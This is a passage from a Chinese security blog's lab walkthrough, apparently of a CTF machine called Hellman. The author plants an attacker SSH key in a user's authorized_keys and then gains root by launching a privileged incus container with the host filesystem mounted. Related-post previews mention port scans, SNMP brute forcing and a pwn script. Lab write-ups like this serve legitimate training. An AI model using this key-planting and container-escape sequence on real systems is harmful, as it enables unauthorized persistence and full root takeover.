+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/home/water $ grep incus /etc/group</span><br><span class="line">incus:x:106:water</span><br><span class="line">incus-user:x:107:</span><br><span class="line">incus-admin:x:108:</span><br><span class="line">/home/water $ mkdir -p ./.ssh</span><br><span class="line">/home/water $ chmod 700 ./.ssh</span><br><span class="line">/home/water $ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCm7PC8+x</span><br><span class="line">t3Umwu8Txo6VjBS3oBkUP2JRqucpRuuceeBC87Vf/CT7FDtw/QAwFWcLwrqMbIMA+T</span><br><span class="line">+AjkAYjGi/nAyTA6sBScH1/PMcy4HjxISaFQ6udCVzEiKUYmpi+/n4/nRf63hUTtnJ</span><br><span class="line">cum+cOPyRbhC2jbihYOSIAl2U+/zXMO1fgc57iTvISRAiOY+eImjGqi4cS/8PpuyTv</span><br><span class="line">uzXxmMkSP5XfssOBMW6+16F9sLyY1YYoZM2k1FakL62BuQtwgGJ9XkWk+EJ1qGNOR4</span><br><span class="line">c6Z7ufKBLTWV6p2ypfGlxfOdoRW98KgwVmwo3W6NXtR75n8v7FBYGWjJdc/DYeYQVC</span><br><span class="line">q2E2gJG5n1l1oD2u8siGpM/935FnsNqA6lmBrF5nq71EzZBGmCexJcPo2mhT4o5zAe</span><br><span class="line">4/x5LO3HITY/KHmFavzgq5QnN6DDuQoZPTYGO3AmheQOECqT8i82mAlpA1uy1PkHUj</span><br><span class="line">/pC/0U/qibYbdmcFLYaYmJDdZxtjnRiMuQyS3m5lID8= root@kali&#x27; &gt;/home/wat</span><br><span class="line">er/.ssh/authorized_keys</span><br><span class="line">/home/water $ chmod 600 ./.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<h5 id="6-用ssh登录"><a href="#6-用ssh登录" class="headerlink" title="6.用ssh登录"></a>6.用ssh登录</h5><p>并查看本地有什么镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(root㉿kali)-[~]</span><br><span class="line">└─# ssh -i water_key water@192.168.0.110</span><br><span class="line">The authenticity of host &#x27;192.168.0.110 (192.168.0.110)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.0.110&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">              _                          </span><br><span class="line">__      _____| | ___ ___  _ __ ___   ___ </span><br><span class="line">\ \ /\ / / _ \ |/ __/ _ \| &#x27;_ ` _ \ / _ \</span><br><span class="line"> \ V  V /  __/ | (_| (_) | | | | | |  __/</span><br><span class="line">  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|</span><br><span class="line">                                         </span><br><span class="line">Hellman:~$ id</span><br><span class="line">uid=1002(water) gid=1002(water) groups=106(incus),1002(water)</span><br><span class="line">Hellman:~$ incus image list</span><br><span class="line">To start your first container, try: incus launch images:opensuse/tumbleweed</span><br><span class="line">Or for a virtual machine: incus launch images:opensuse/tumbleweed --vm</span><br><span class="line"></span><br><span class="line">+-------+--------------+--------+------------------------------------+--------------+-----------+---------+----------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |            DESCRIPTION             | ARCHITECTURE |   TYPE    |  SIZE   |     UPLOAD DATE      |</span><br><span class="line">+-------+--------------+--------+------------------------------------+--------------+-----------+---------+----------------------+</span><br><span class="line">|       | 8a2d8db850b1 | no     | Alpine edge amd64 (20260128_13:00) | x86_64       | CONTAINER | 3.27MiB | 2026/01/30 17:34 CST |</span><br><span class="line">+-------+--------------+--------+------------------------------------+--------------+-----------+---------+----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Hellman:~$ incus init images:alpine/edge pwn -c security.privileged=true</span><br><span class="line">Creating pwn</span><br><span class="line">Hellman:~$ incus config device add pwn mydevice disk source=/ path=/mnt/root</span><br><span class="line">recursive=true</span><br><span class="line">Device mydevice added to pwn</span><br><span class="line">Hellman:~$ incus start pwn</span><br><span class="line">Hellman:~$ incus exec pwn /bin/sh</span><br><span class="line">~ # id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>查看flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cd /mnt/root/root/root.txt</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Xiaxiaran</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/30/hellman-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/">http://example.com/2026/01/30/hellman-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/SUID%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">SUID逆向分析</a><a class="post-meta__tags" href="/tags/incus%E6%8F%90%E6%9D%83/">incus提权</a></div><div class="post-share"><div class="social-share" data-image="/images/1.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2099/09/09/%E7%95%99%E8%A8%80%E6%9D%BF/" title="留言板"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">留言板</div></div><div class="info-2"><div class="info-item-1">contact me: QQ:2732148214 </div></div></div></a><a class="pagination-related" href="/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="worm_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">worm_提权处理</div></div><div class="info-2"><div class="info-item-1">一、信息收集1.首先进行端口扫描123456789101112┌──(kali㉿kali)-[~/Desktop]└─$ nmap -p- 192.168.0.112                  Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 06:27 ESTNmap scan report for 192.168.0.112 (192.168.0.112)Host is up (0.00096s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:BD:38:9F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds  发现开了两个端口 2.目录扫描12...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="worm_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-24</div><div class="info-item-2">worm_提权处理</div></div><div class="info-2"><div class="info-item-1">一、信息收集1.首先进行端口扫描123456789101112┌──(kali㉿kali)-[~/Desktop]└─$ nmap -p- 192.168.0.112                  Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 06:27 ESTNmap scan report for 192.168.0.112 (192.168.0.112)Host is up (0.00096s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:BD:38:9F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds  发现开了两个端口 2.目录扫描12...</div></div></div></a><a class="pagination-related" href="/2025/12/18/ezpwn-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="ezpwn_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-18</div><div class="info-item-2">ezpwn_提权处理</div></div><div class="info-2"><div class="info-item-1">首先扫描端口 1nmap -sV -T4 -p- 192.168.43.100   发现开了一个6538的端口 下载overflow文件并用idapro打开 用f5查看伪代码并进入start里面 1234567891011int __cdecl start()&#123;  char a[12]; // [rsp+Fh] [rbp-11h] BYREF  char c[2]; // [rsp+1Bh] [rbp-5h]  char b[3]; // [rsp+1Dh] [rbp-3h]  gets(a);  //当输入长度超过a的大小时会溢出覆盖c和b的内存  if ( b[1] == 115 &amp;&amp; c[1] == 112 )    port();  return 0;&#125;  这里我们利用栈溢出漏洞来写一个pwn脚本 12345678910111213141516171819from pwn import *proc = remote(&#x27;192.168.43.100&#x27;, 9999)# 构造 payload：# a[12] + 填充到c[...</div></div></div></a><a class="pagination-related" href="/2026/01/22/114-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="114_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-22</div><div class="info-item-2">114_提权处理</div></div><div class="info-2"><div class="info-item-1">一、信息收集首先进行端口扫描 123456789101112nmap -p- 192.168.0.111             Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 08:02 ESTNmap scan report for 192.168.0.111 (192.168.0.111)Host is up (0.0013s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:00:02:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds  发现是常见的80端口和22端口 接下来进行目录扫描 1234567891011121314151617181...</div></div></div></a><a class="pagination-related" href="/2026/01/21/113-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="113_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-21</div><div class="info-item-2">113_提权处理</div></div><div class="info-2"><div class="info-item-1">一、信息收集扫描tcp udp 1nmap -sV -T4 -p- 192.168.0.105  1sudo nmap -sU -F 192.168.0.105    扫到了一个161端口 161端口是常见的SNMP服务 很多设备的SNMP配置了默认的社区字符串（如public&#x2F;private） 用工具读取系统信息 用户列表 甚至修改配置 1.用snmpwalk枚举系统信息 1snmpwalk -v2c -c public 192.168.0.105  2.用onesixtyone 爆破社区字符串 1onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.0.105   可以看到用户名和密码 welcome：mMOq2WWONQiiY8TinSRF 接下来用ssh进行连接 1ssh welcome@192.168.0.105    二、提取处理用sudo -l可以看到存在&#x2F;opt&#x2F;113.sh 123456789welcom...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/images/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Xiaxiaran</div><div class="author-info-description">Welcome to my first blog</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xiaxiaran"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xiaxiaran/xiaxiaran.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2732148214&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">1.端口扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">2.目录扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE"><span class="toc-text">3.利用密钥交换协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86"><span class="toc-text">二、提权处理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-ssh%E8%BF%9E%E6%8E%A5"><span class="toc-text">1.ssh连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8Bsuid"><span class="toc-text">2.查看suid</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%86%E6%9E%90main%E5%87%BD%E6%95%B0"><span class="toc-text">3.分析main函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%89%A7%E8%A1%8C-sh"><span class="toc-text">4.执行 sh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-water%E6%8F%90%E6%9D%83"><span class="toc-text">5.water提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E7%94%A8ssh%E7%99%BB%E5%BD%95"><span class="toc-text">6.用ssh登录</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2099/09/09/%E7%95%99%E8%A8%80%E6%9D%BF/" title="留言板">留言板</a><time datetime="2099-09-09T01:50:25.000Z" title="Created 2099-09-09 09:50:25">2099-09-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/30/hellman-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="hellman_提权处理">hellman_提权处理</a><time datetime="2026-01-30T13:08:40.000Z" title="Created 2026-01-30 21:08:40">2026-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="worm_提权处理">worm_提权处理</a><time datetime="2026-01-24T13:08:40.000Z" title="Created 2026-01-24 21:08:40">2026-01-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/22/114-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="114_提权处理">114_提权处理</a><time datetime="2026-01-22T13:08:40.000Z" title="Created 2026-01-22 21:08:40">2026-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/113-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="113_提权处理">113_提权处理</a><time datetime="2026-01-21T13:08:40.000Z" title="Created 2026-01-21 21:08:40">2026-01-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Xiaxiaran</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'xiaxiaran/xiaxiaran.github.io',
+      'data-repo-id': 'R_kgDOQoya5A',
+      'data-category-id': 'DIC_kwDOQoya5M4Cz_cf',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
